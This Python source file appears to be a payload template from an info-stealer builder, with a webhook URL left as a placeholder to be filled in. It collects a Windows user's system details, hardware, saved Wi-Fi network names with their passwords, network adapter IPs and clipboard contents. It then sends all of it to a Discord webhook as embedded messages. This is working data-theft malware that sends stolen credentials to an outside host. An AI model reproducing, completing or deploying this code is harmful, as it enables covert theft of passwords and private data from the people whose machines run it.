from network_info import get_saved_wifi, get_network_adapters
from system_info import get_system_info
from tkinter import Tk
import requests
import json
import wmi

def get_pc_components():
    c = wmi.WMI()
    components = {
        "CPU": "Unknown",
        "GPU": [],
        "Motherboard": "Unknown",
        "RAM": [],
        "Storage": []
    }
    for cpu in c.Win32_Processor():
        components["CPU"] = cpu.Name
    for gpu in c.Win32_VideoController():
        components["GPU"].append(gpu.Name)
    for board in c.Win32_BaseBoard():
        components["Motherboard"] = board.Product
    for mem in c.Win32_PhysicalMemory():
        ram_info = f"{mem.Manufacturer} {str(int(mem.Capacity) // (1024**3))}GB `{mem.PartNumber.strip()}`"
        components["RAM"].append(ram_info)
    for disk in c.Win32_DiskDrive():
        components["Storage"].append(disk.Model)
    return components

def get_clipboard_content():
    clipboard_content = None
    root = None
    try:
        root = Tk()
        root.withdraw()
        clipboard_content = root.clipboard_get()
    finally:
        if root:
            root.destroy()

    return clipboard_content or "Empty"

def send_to_discord(system_info=None, components=None, wifi_info=None, network_adapters=None, clipboard_content=None):
    webhook_url = "{self.webhook_url}"

    def create_embed(title, fields):
        fields = [field for field in fields if field["value"]]
        if fields:
            return {{"title": title, "fields": fields}}
        return None
    
    embeds = []

    if system_info:
        system_info_fields = [
            {{"name": "Username", "value": system_info["Username"]}},
            {{"name": "OS", "value": system_info["OS"]}},
            {{"name": "System", "value": system_info["System"]}},
            {{"name": "Node Name", "value": system_info["Node Name"]}},
            {{"name": "System Manufacturer", "value": system_info["System Manufacturer"]}},
            {{"name": "System Model", "value": system_info["System Model"]}},
            {{"name": "BIOS Version", "value": system_info["BIOS Version"]}},
            {{"name": "Uptime", "value": system_info["Uptime"]}}
        ]
        system_info_embed = create_embed("System Information", system_info_fields)
        if system_info_embed:
            embeds.append(system_info_embed)

    if components:
        components_fields = [
            {{"name": "CPU", "value": components["CPU"]}},
            {{"name": "GPU", "value": "\\n".join(components["GPU"])}},
            {{"name": "Motherboard", "value": components["Motherboard"]}},
            {{"name": "RAM", "value": "\\n".join(components["RAM"])}},
            {{"name": "Storage", "value": "\\n".join(components["Storage"])}}
        ]
        components_embed = create_embed("Components", components_fields)
        if components_embed:
            embeds.append(components_embed)

    if wifi_info:
        wifi_fields = [{{"name": "SSID", "value": f"{{wifi['SSID']}} - Password: {{wifi['Password']}}" if wifi['Password'] else wifi['SSID']}} for wifi in wifi_info]
        wifi_embed = create_embed("Saved Wi-Fi Networks", wifi_fields)
        if wifi_embed:
            embeds.append(wifi_embed)

    if network_adapters:
        ip_fields = [{{"name": interface, "value": ip}} for interface, ip in network_adapters.items()]
        ip_embed = create_embed("Network Adapters", ip_fields)
        if ip_embed:
            embeds.append(ip_embed)

    if clipboard_content:
        clipboard_fields = [{{"name": "Clipboard Content", "value": clipboard_content}}]
        clipboard_embed = create_embed("Clipboard", clipboard_fields)
        if clipboard_embed:
            embeds.append(clipboard_embed)

    if embeds:
        data = {{"embeds": embeds}}
        headers = {{"Content-Type": "application/json"}}
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        if response.status_code == 204:
            print("Message sent successfully.")
        else:
            print(f"Failed to send message. Status code: {{response.status_code}}")
    else:
        print("No data to send.")